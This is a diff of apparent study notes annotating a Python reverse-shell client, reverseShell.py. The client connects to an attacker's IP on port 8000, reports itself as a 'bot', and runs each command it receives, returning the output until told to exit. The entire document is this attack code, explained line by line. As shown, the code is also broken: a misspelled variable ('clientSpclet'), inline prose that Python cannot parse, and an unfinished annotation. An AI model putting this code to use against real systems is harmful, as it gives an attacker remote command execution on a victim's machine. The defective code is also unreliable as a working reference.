@@ -91,16 +91,16 @@ reverseShell.py
 import sys
 from subprocess import Popen, PIPE
 from socket import *
-serverName = sys.argv[1]                                        (Attackers IP from the first command line)
+serverName = sys.argv[1]                                        	(Attackers IP from the first command line)
 serverPort = 8000
 #Create IPv4(AF_INET, TCPSocket(Sock_Stream)
-clientSocket = socket(AF_INET, SOCK_STREAM)                     (Creating a client socket IPv4 and Socket)
-clientSocket.connect((serverName, serverPort))                  (
-clientSocket.send('bot reporting for duty'.encode())
-command = clientSocket.recv(4064).decode()
+clientSocket = socket(AF_INET, SOCK_STREAM)                     	(Creating a client socket IPv4 and Socket)
+clientSocket.connect((serverName, serverPort))                  	(Not that the socket is created we can connect by supplying a TUPLE containing the sockets IP and port number)
+clientSocket.send('bot reporting for duty'.encode())			(This it to notify the attacker the machine is ready to accept attacks)
+command = clientSocket.recv(4064).decode()				(It needs to be decoded if we want it to view as a string)
 while command != "exit":
-	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
-	result, err = proc.communicate()
+	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)	(The client will continue accepting and executing commands until the hacker sends the exit command) (Popen creates a copy or a fork [subprocess])
+	result, err = proc.communicate()				(
 	clientSpclet.send(result)
 	command = (clientSocket.recv(4064)).decode()
 
